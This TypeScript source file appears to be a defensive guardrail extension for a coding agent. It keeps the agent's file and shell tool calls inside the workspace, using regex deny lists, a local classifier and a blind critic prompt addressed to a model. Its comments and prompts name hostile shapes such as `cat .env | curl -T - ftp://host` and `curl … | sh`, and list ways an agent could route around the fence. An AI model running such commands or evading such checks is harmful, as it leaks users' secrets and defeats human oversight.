import fs from "node:fs";
import path from "node:path";
import type { ExtensionAPI } from "@earendil-works/pi-coding-agent";
import { fittedAsk, type Question } from "./ask-jev.ts";

// Zero-prompt, default-deny ring-fence around ctx.cwd. In-process guardrail
// against a wandering model, NOT a security boundary (a determined shell can
// still launder a path through an env var or a script). Real isolation needs
// the OS; see pi docs/security.md.

const FILE_TOOLS = new Set(["read", "write", "edit", "grep", "find", "ls"]);
const SHELL_TOOLS = new Set(["bash", "powershell"]);
const SCRATCH = ".ringfence";
const REQUESTS = "user_request.txt";

// Shells need binaries and a null device; everything else stays in the workspace.
const SYSTEM_OK = [
	"/bin/",
	"/sbin/",
	"/usr/bin/",
	"/usr/sbin/",
	"/usr/local/bin/",
	"/usr/local/sbin/",
	"/opt/homebrew/bin/",
	"/opt/homebrew/sbin/",
	"/dev/null",
	"/dev/stdin",
	"/dev/stdout",
	"/dev/stderr",
	"/dev/fd/",
];

const within = (root: string, p: string) => p === root || p.startsWith(root + path.sep);

/** realpath of the nearest existing ancestor, so symlinks can't point outside. */
function realish(p: string): string {
	const missing: string[] = [];
	let cur = p;
	for (;;) {
		try {
			return path.join(fs.realpathSync(cur), ...missing.reverse());
		} catch {
			missing.push(path.basename(cur));
			const up = path.dirname(cur);
			if (up === cur) return cur;
			cur = up;
		}
	}
}

/** Returns a reason string when `target` escapes `root`. */
export function checkPath(target: unknown, root: string): string | undefined {
	if (typeof target !== "string" || target === "") return undefined;
	if (target === "~" || target.startsWith("~/") || /\$\{?HOME\}?/.test(target)) {
		return `path "${target}" points at the home directory`;
	}
	const abs = path.resolve(root, target);
	if (!within(root, abs)) return `path "${target}" resolves to ${abs}, outside the workspace`;
	const real = realish(abs);
	if (!within(realish(root), real)) return `path "${target}" resolves through a link to ${real}, outside the workspace`;
	return undefined;
}

// Quote-aware split, so a quoted sed/grep pattern stays one opaque token.
function tokenize(cmd: string): string[] {
	const out: string[] = [];
	let cur = "";
	let quote = "";
	const flush = () => {
		const t = cur.replace(/^["'`$!]+/, "").replace(/["'`,;]+$/, "");
		if (t) out.push(t);
		cur = "";
	};
	for (const ch of cmd) {
		if (quote) {
			if (ch === quote) quote = "";
			else cur += ch;
		} else if (ch === "'" || ch === '"' || ch === "`") quote = ch;
		else if (/[\s;|&()<>]/.test(ch)) flush();
		else cur += ch;
	}
	flush();
	return out;
}

// Fences off machine-wide state: absolute paths outside the workspace.
const OUTSIDE = /(?:^|[^A-Za-z0-9_./-])\/(?:etc|Users|home|root|private|var|opt|tmp|System|Library|Applications|snap)(?:\/|$)/;

// "Accidents" the fence exists to stop: machine-wide installs, privileged or
// destructive system changes, force-pushes. Matched on the raw command.
const CONSENT_NEEDED: Array<[RegExp, string]> = [
	[/\b(sudo|doas|su|launchctl|dscl|security\s+(find|delete|extract|add)|defaults\s+write|crontab|networksetup|pmset|sysctl\s+-w|dd\s+if=|mkfifo|chmod\s+-R\s+777)\b/, "privileged/system change"],
	[/\b(npm|pnpm|yarn|bun|npm-ci|pip3?|pipx|uv|gem|cargo|go)\b[^|;&]*\s(--global|-g|--user)(\s|$)/, "global/user-scoped package install"],
	[/\bbrew\s+(install|uninstall|upgrade|tap|link|unlink|services)\b/, "Homebrew change (machine-wide)"],
	[/\b(npm|yarn|pnpm)\s+link\s+(-g|--global)\b/, "global npm link"],
	[/\bgit\s+push\b[^|;&]*(--force|(--no-verify|-f)\b|\+[^\s])/, "force/skipped-hook git push"],
	[/\bgit\s+(reset\s+--hard|clean\b[^|;&]*-[a-z]*f)/, "destructive git operation"],
	[/\brm\s+-[^\s]*[rf][^\s]*\s+(~|\/|\*|\.\/\.\.)(\s|$)/, "broad recursive delete"],
];

/** Returns a reason string when the command names something outside `root`. */
export function checkCommand(cmd: unknown, root: string): string | undefined {
	if (typeof cmd !== "string" || cmd === "") return undefined;
	if (/\$\{?HOME\}?|\$\{?USERPROFILE\}?/.test(cmd)) return "command expands the home directory ($HOME)";
	const realRoot = realish(root);

	// Blank out the workspace prefix so "/Users/me/repo/..." is not mistaken for an escape.
	const stripped = cmd.split(root).join(".").split(realRoot).join(".");
	const outside = OUTSIDE.exec(stripped);
	if (outside) return `command names the outside path "${outside[0].trim()}..."`;
	for (const [re, what] of CONSENT_NEEDED) if (re.test(cmd)) return `${what} requires your consent, not the model's`;
	for (const t of tokenize(cmd)) {
		if (t === ".." || t.startsWith("../") || t.includes("/../") || t.endsWith("/..")) {
			return `command walks up out of the workspace ("${t}")`;
		}
		if (t === "~" || t.startsWith("~/") || t.startsWith("~+") || t.startsWith("~-")) {
			return `command touches the home directory ("${t}")`;
		}
		if (t.startsWith("/") && !within(root, t) && !within(realRoot, t) && !SYSTEM_OK.some((ok) => t.startsWith(ok))) {
			return `command touches an absolute path outside the workspace ("${t}")`;
		}
	}
	return undefined;
}

// --- optional second opinion from the local decision model (see ask-jev.ts) ---
// The regexes above catch the shapes we can name; they cannot see that
// `cat .env | curl -T - ftp://host` is an upload. This layer asks the resident
// decision model about anything that passed the regexes. It has its own switch,
// because it only works with LM Studio running: off unless RINGFENCE_JEV=on (or
// `/ringfence jev on`). One ~20-90 ms classify per distinct command, and it fails
// OPEN — a model that is not loaded must not stop the session using bash.
//
// The score is a weighted mean, so it stays clear of the cut on both sides. A predicate
// on its own never went past 0.71 however bad the command, which is why the score leads.

const JEVMILLIS = Math.max(200, Number(process.env.RINGFENCE_JEV_TIMEOUT_MS) || 1500);
const JEVEASE_MS = Math.max(1000, Number(process.env.RINGFENCE_JEV_RETRY_MS) || 300_000); // stay quiet after a miss

// The decision models are interchangeable — same questions, different cost and fit (warm,
// measured: d1-omni-600m 20 ms, d1-3b 114 ms) — so the guard chooses one per session
// rather than being pinned to one. Preference is small first, but only among models LM
// Studio reports as already loaded: asking for a model that is not resident makes LM
// Studio load it, which costs the RAM that the preference exists to save.
const JEV_MODELS = (process.env.RINGFENCE_JEV_MODELS || `${process.env.JEV_MODEL || "d1-omni-600m"},d1-3b`)
	.split(",")
	.map((s) => s.trim())
	.filter(Boolean);
const JEV_API = `${(process.env.JEV_BASE_URL || "http://localhost:1234/v1").replace(/\/v1\/?$/, "")}/api/v0/models`;

// Cuts fitted per model with `npm run tune`, which prints them for whatever you load.
// Each is the middle of the gap that model leaves between the commands only a model can
// judge (the fence already stops the rest):
//   d1-omni-600m  risky <= 0.50 | ordinary >= 1.01; its leak question woke only for a key (0.86),
//                 and read 36% on a clean `prisma migrate reset`, so that cut stays high on purpose
//   d1-3b         risky <= 0.51 | ordinary >= 1.11; its leak question woke for every upload (0.87-0.96)
//                 and the worst it gave ordinary work was 64% (a scp of a tarball it was told to send)
const JEV_CUTS: Array<[string, number, number]> = [
	["d1-omni-600m", 0.7, 0.7],
	["d1-3b", 0.8, 0.8], // also "d1-3b:2": same weights, bigger context
];

/** Cut pair for one model; an unmeasured model gets the tighter set, which stops less. */
function cutsFor(model: string) {
	const hit = JEV_CUTS.find(([id]) => model === id || model.startsWith(`${id}:`));
	return {
		risk: Number(process.env.RINGFENCE_JEV_RISK) || hit?.[1] || 0.7, // block at or below
		leak: Number(process.env.RINGFENCE_JEV_LEAK) || hit?.[2] || 0.7, // block at or above
	};
}

let jevPick = { id: JEV_MODELS[0], until: 0 };

/** The preferred decision model that is already loaded; the first preference otherwise. */
async function jevPickModel(): Promise<string> {
	if (Date.now() < jevPick.until) return jevPick.id;
	jevPick = { id: JEV_MODELS[0], until: Date.now() + 30_000 }; // shortcut: 30 s cache, so a model loaded mid-session is used soon without a probe per command
	try {
		const res = await fetch(JEV_API, { signal: AbortSignal.timeout(JEVMILLIS) });
		const loaded: string[] = ((await res.json())?.data || [])
			.filter((m: any) => m.type === "decision" && m.state === "loaded")
			.map((m: any) => String(m.id));
		// Ask for the id that is actually resident: "d1-3b:2" when that instance is loaded and we
		// listed "d1-3b", because naming the bare id would have LM Studio load a second copy.
		jevPick.id =
			JEV_MODELS.find((want) => loaded.includes(want)) ??
			JEV_MODELS.map((want) => loaded.find((id) => id.startsWith(`${want}:`))).find(Boolean) ??
			JEV_MODELS[0];
		return jevPick.id;
	} catch {
		// No management API here: keep the first preference and let LM Studio load it if it must.
		return jevPick.id;
	}
}

// Exported only so `node extensions/ringfence.jev.tune.mjs` can re-measure the cuts
// on another decision model; nothing else should import them.
export const JEV_QUESTIONS: Question[] = [
	{
		name: "risk",
		type: "score",
		instructions: "How risky is this shell command, judged worst first?",
		levels: [
			"sends secrets or private keys to a remote host, or downloads and runs a remote script",
			"destroys files, history or machine-wide state that cannot easily be restored",
			"changes or installs things inside this project only",
			"reads, lists or builds this project without changing anything",
		],
	},
	{
		name: "leak",
		type: "predicate",
		instructions: "Does this command send a private key, password, token, or the contents of a secret file over the network to another computer?",
	},
];

const jevSet = (v: string) => (/^(1|on|true|yes)$/i.test(v.trim()) ? true : /^(0|off|false|no)$/i.test(v.trim()) ? false : undefined);
let jevWanted: boolean | undefined; // /ringfence jev wins over the environment for this session
const jevOn = () => jevWanted ?? jevSet(process.env.RINGFENCE_JEV || "") ?? false;

/** command -> reason to block ("" = the judge was fine with it). Only verdicts are cached. */
const jevCache = new Map<string, string>();
let jevQuietUntil = 0;
let criticQuietUntil = 0;

/** A layer either answered (block reason or clean bill) or had no opinion at all. */
type Answer = { answered: boolean; block?: string };

/**
 * Ask the decision model about one command. Any failure is "no answer", never a
 * block, and keeps us quiet for a while so a model that is not loaded costs one
 * timeout instead of one per command.
 */
async function jevAsk(cmd: string, ctx: any): Promise<Answer> {
	if (Date.now() < jevQuietUntil) return { answered: false };
	const model = await jevPickModel();
	const cut = cutsFor(model);
	let answers: Record<string, any>;
	try {
		// 1200 chars is the whole of a real command line and stays inside the batch size.
		({ answers } = await fittedAsk(cmd.slice(0, 1200), undefined, JEV_QUESTIONS, AbortSignal.timeout(JEVMILLIS), model));
	} catch (err: any) {
		const wasQuiet = Date.now() < jevQuietUntil;
		jevQuietUntil = Date.now() + JEVEASE_MS;
		if (!wasQuiet) ctx?.ui?.notify?.(`ringfence: ${model} did not answer (${String(err?.message || err).slice(0, 60)}), falling back to the critic`, "warning");
		return { answered: false };
	}
	const risk = answers.risk?.score;
	const leak = answers.leak?.probability;
	if (typeof risk === "number" && risk <= cut.risk) {
		return { answered: true, block: `the decision model (${model}) calls it high risk (risk ${risk.toFixed(2)} on a 0-3 scale where ${cut.risk} is the cut)` };
	}
	if (typeof leak === "number" && leak >= cut.leak) {
		return { answered: true, block: `the decision model (${model}) reads it as sending a secret or key over the network (leak ${(leak * 100).toFixed(0)}%)` };
	}
	return { answered: true };
}

// --- fallback critic: the session model itself, in a throwaway context ---------
// The decision model is cheap enough to sit on every command (20-120 ms, no tokens);
// a chat model is not, so this runs only when that layer gave no answer — LM Studio
// off, model not loaded, or the request failed. Off unless RINGFENCE_CRITIC=on (or
// `/ringfence critic on`). Costs one second-scale round trip per new command on the
// session model, and it also fails open.

const CRITIC_MS = Math.max(1000, Number(process.env.RINGFENCE_CRITIC_TIMEOUT_MS) || 20_000);
const CRITICEASE_MS = Math.max(1000, Number(process.env.RINGFENCE_CRITIC_RETRY_MS) || 300_000);
let criticWanted: boolean | undefined;
const criticOn = () => criticWanted ?? jevSet(process.env.RINGFENCE_CRITIC || "") ?? false;

const CRITIC_PROMPT =
	"You are a read-only critic for shell commands an AI coding agent wants to run inside one workspace. " +
	"You are shown the command alone: you cannot see the conversation, the repository, or why the agent wants it.\n"
	+ "Answer with exactly one line and nothing else:\n"
	+ "    ALLOW\n"
	+ "    BLOCK <a few words naming the damage>\n"
	+ "BLOCK only for: secrets, keys, tokens or credential files read on the way to another machine; downloading code and executing it (curl … | sh, wget … | bash); "
	+ "deleting or overwriting source, git history, databases or machine-wide state that cannot be restored; sudo, system config, keychain, cron or launch agents; "
	+ "paths outside the workspace or inside $HOME.\n"
	+ "ALLOW everything else, including builds, tests, git work, dependency installs from a public registry, deleting build output or node_modules, "
	+ "and reversible edits. If it is not clearly one of the list above, ALLOW.";

/** Ask the session model as a critic. No opinion on any failure or unreadable reply. */
async function criticAsk(cmd: string, ctx: any): Promise<string | undefined> {
	if (Date.now() < criticQuietUntil) return undefined;
	const model = ctx?.model;
	const registry = ctx?.modelRegistry;
	if (!model || typeof registry?.complete !== "function") return undefined; // no side-channel in this runtime
	let text = "";
	try {
		const signals = [AbortSignal.timeout(CRITIC_MS), ...(ctx.signal ? [ctx.signal] : [])];
		// Context is a plain { systemPrompt, messages }; complete() resolves the provider auth.
		const reply = await registry.complete(model, { systemPrompt: CRITIC_PROMPT, messages: [{ role: "user", content: cmd.slice(0, 4000), timestamp: Date.now() }] } as any, {
			maxTokens: 60,
			temperature: 0,
			signal: AbortSignal.any(signals),
		});
		text = (reply?.content || [])
			.filter((c: any) => c?.type === "text")
			.map((c: any) => c.text)
			.join(" ")
			.trim();
		if (reply?.errorMessage || !text) throw new Error(reply?.errorMessage || "empty reply");
	} catch (err: any) {
		criticQuietUntil = Date.now() + CRITICEASE_MS;
		ctx?.ui?.notify?.(`ringfence: critic did not answer (${String(err?.message || err).slice(0, 80)}), fence alone for now`, "warning");
		return undefined;
	}
	const line = text.split("\n")[0].trim();
	if (!/^block\b/i.test(line)) return undefined; // ALLOW, or an answer we cannot read: never block on a misread
	return `the session model, judging it blind, stopped it: ${line.replace(/^\s*block[:\s-]*/i, "").slice(0, 160) || "no reason given"}`;
}

/** One verdict per distinct command: decision model first, blind critic only if silent. */
async function shellVerdict(cmd: string, ctx: any): Promise<string | undefined> {
	const seen = jevCache.get(cmd);
	if (seen !== undefined) return seen || undefined;
	let block: string | undefined;
	let answered = false;
	if (jevOn()) {
		const a = await jevAsk(cmd, ctx);
		({ answered, block } = a);
	}
	if (!answered && criticOn()) {
		block = await criticAsk(cmd, ctx);
		answered = block !== undefined; // a silent critic is no opinion, not a clean bill
	}
	if (answered) {
		if (jevCache.size > 500) jevCache.clear(); // shortcut: bounded cache, emptied wholesale
		jevCache.set(cmd, block || "");
	}
	return block;
}

function scratchDir(root: string): string {
	const dir = path.join(root, SCRATCH);
	try {
		fs.mkdirSync(dir, { recursive: true });
		const gi = path.join(dir, ".gitignore");
		if (!fs.existsSync(gi)) fs.writeFileSync(gi, "*\n"); // keep the fence out of git status
	} catch {
		/* read-only workspace: the reminder is still useful */
	}
	return dir;
}

function slap(why: string, root: string, judged = false) {
	const dir = scratchDir(root);
	return {
		block: true,
		reason:
			`RINGFENCE (not executed): ${why}.\n` +
			(judged
				? "This stop came from a model reading the command, not from a rule of the fence, and it cannot see why you want the command. If your task genuinely needs this exact command, do not rephrase it and retry: say plainly in your reply what you needed to run and why, and leave it to the human to run it or to turn the judging layer off with /ringfence.\n"
				: "") +
			`This session is ring-fenced to ${root}. At all costs stay out of the home directory (~/*, $HOME/*, dotfiles, keychains), other repositories, /tmp, and any absolute path outside ${root}, and do not route around this block with another tool, an env var, a heredoc script, or a helper file.\n` +
			`Stay on the assigned task inside the workspace and do not try to route around this block with another tool, an env var, a heredoc, a script file, or a decoded string.\n` +
			`If the task genuinely needs something from outside the fence (a global package, a credential, a file from elsewhere, a system or destructive change), append one line saying what and why to ${path.join(root, REQUESTS)}, then continue with the best in-fence alternative and note the limitation in your final answer. Do not wait for approval.\n` +
			`Temp or scratch files go in ${dir}/ (workspace-local, git-ignored, created for you); delete that directory when you are done. Note: ${REQUESTS} is kept on purpose.`,
	};
}

export default function (pi: ExtensionAPI) {
	pi.on("tool_call", async (event, ctx) => {
		if (process.env.RINGFENCE === "off") return undefined; // emergency escape hatch
		const root = path.resolve(ctx.cwd || process.cwd());
		const input = event.input as Record<string, unknown> | undefined;

		if (FILE_TOOLS.has(event.toolName)) {
			const why = checkPath(input?.path, root);
			return why ? slap(why, root) : undefined;
		}
		if (!SHELL_TOOLS.has(event.toolName)) return undefined;
		const cmd = input?.command;
		const why = checkCommand(cmd, root);
		if (why) return slap(why, root);
		if (!jevOn() && !criticOn()) return undefined; // second opinions are opt-in, shells only
		const judged = await shellVerdict(String(cmd ?? ""), ctx);
		return judged ? slap(judged, root, true) : undefined;
	});

	// Live toggles for the two judging layers; the fence itself stays an env decision
	// (RINGFENCE=off) so a session cannot talk itself out of being fenced.
	pi.registerCommand("ringfence", {
		description: "Show or toggle the command judges: /ringfence [jev|critic] [on|off]",
		handler: async (args: string, ctx: any) => {
			const [what, how] = String(args || "").trim().toLowerCase().split(/\s+/);
			const flip = (current: boolean) => (how ? jevSet(how) : !current);
			if (what === "jev") {
				jevWanted = flip(jevOn());
				if (jevWanted) {
					jevQuietUntil = 0; // just asked for: try the model now
					jevPick.until = 0; // and re-read which decision model is resident
				}
			} else if (what === "critic") {
				criticWanted = flip(criticOn());
				if (criticWanted) criticQuietUntil = 0;
			}
			const on = (v: boolean, detail: string) => (v ? `on${detail ? ` (${detail})` : ""}` : "off");
			const cut = cutsFor(jevPick.id);
			ctx?.ui?.notify?.(
				`ringfence — fence: ${process.env.RINGFENCE === "off" ? "OFF (RINGFENCE=off)" : "on"} | decision model: ${on(jevOn(), `${jevPick.id}, risk cut ${cut.risk}, leak cut ${cut.leak}`)} | critic: ${on(criticOn(), "only when the decision model is silent")} | ${jevCache.size} commands judged`,
				"info",
			);
		},
	});

	// Clean the scratch pad up after ourselves.
	// ponytail: deletes shared .ringfence on exit; per-session subdir if concurrent runs collide.
	pi.on("session_shutdown", (_event, ctx) => {
		const root = realish(path.resolve(ctx.cwd || process.cwd()));
		const dir = path.join(root, SCRATCH);
		if (path.basename(dir) === SCRATCH && within(root, dir)) fs.rmSync(dir, { recursive: true, force: true });
	});
}
